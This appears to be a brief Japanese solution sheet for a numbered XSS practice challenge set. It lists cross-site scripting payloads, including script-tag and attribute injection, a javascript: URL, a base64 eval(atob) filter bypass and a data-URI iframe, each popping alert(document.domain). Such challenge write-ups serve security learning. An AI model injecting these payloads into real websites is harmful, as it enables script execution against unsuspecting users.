##xss_challenges##

#####1#####
```html
<script>alert(document.domain);</script>
```


#####2#####
```html
" onmouseover='alert(document.domain)'
```


#####3#####
<p>これを</p>
```html
<select name="p2">
    <option>Japan</option>
    <option>Germany</option>
    <option>USA</option>
    <option>United Kingdom</option>
</select>
```

<p>こう</p>
```html
<select name="p2">
    <option>
        <script>
            alert(document.domain);
        </script>
    </option>
</select>
```


####4####
<p>これを</p>
```html
<input type="hidden" value="hackme" name="p3">
```

<p>こう</p>
```html
<input type="hidden" value="hackme" name="p3"><script>alert(document.domain);</script>
```


####5####
<p>maxlengthを適当に増やして</p>
```html
" onmouseover='alert(document.domain)'
```


####5####
<p>maxlengthを適当に増やして</p>
```html
" onmouseover='alert(document.domain)'
```


#####6#####
<p>2と同じ</p>
```html
" onmouseover='alert(document.domain)'
```


#####7#####
<p>6と似てる</p>
```html
" onmouseover=alert(document.domain)
```


#####8#####
```javascript
javascript:alert(document.domain);
```


#####10#####
```sh
$ echo "alert(document.domain);" | base64
YWxlcnQoZG9jdW1lbnQuZG9tYWluKTsK
```

```html
"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKTsK'))</script>
```


#####11#####
```sh
$ echo "<script>alert(document.domain);</script>" | base64
PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pgo=
```

```html
"><iframe src="data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pgo=">
```
